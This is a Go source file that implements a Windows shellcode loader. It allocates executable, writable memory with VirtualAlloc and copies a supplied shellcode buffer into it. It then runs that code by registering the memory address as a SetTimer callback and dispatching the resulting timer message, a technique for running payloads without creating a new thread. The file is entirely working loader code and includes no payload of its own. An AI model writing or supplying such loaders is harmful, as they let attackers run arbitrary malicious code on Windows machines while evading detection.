package TT

import (
	"syscall"
	"unsafe"
)

var (
	g_InitOnce [0]byte
	lpContext  [0]byte
)

type MSG struct {
}

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	NULL                   = 0
	dummy                  = 0
)

var (
	kernel32         = syscall.MustLoadDLL("kernel32.dll")
	ntdll            = syscall.MustLoadDLL("ntdll.dll")
	User32           = syscall.MustLoadDLL("User32.dll")
	VirtualAlloc     = kernel32.MustFindProc("VirtualAlloc")
	SetTimer         = User32.MustFindProc("SetTimer")
	GetMessageW      = User32.MustFindProc("GetMessageW")
	DispatchMessageW = User32.MustFindProc("DispatchMessageW")
	RtlMoveMemory    = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	msg := MSG{}
	SetTimer.Call(NULL, dummy, NULL, addr)
	GetMessageW.Call((uintptr)(unsafe.Pointer(&msg)), NULL, 0, 0)
	DispatchMessageW.Call((uintptr)(unsafe.Pointer(&msg)))
}
